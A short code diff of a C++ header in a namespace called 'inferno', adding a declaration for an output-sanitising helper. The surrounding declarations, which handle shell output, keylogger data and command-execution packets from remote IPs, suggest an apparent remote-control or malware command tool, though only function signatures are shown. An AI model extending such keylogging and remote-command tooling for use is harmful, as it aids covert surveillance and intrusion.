@@ -42,6 +42,7 @@ private:
     static void printShellOutput(const std::string& ip, const std::string& payload);
     static void printKeylogData(const std::string& ip, const std::string& payload);
     static std::string buildCmdExecPacket(const std::string& command);
+    static std::string sanitizeOutput(const std::string& s, size_t offset, size_t len);
 };
 
 } // namespace inferno
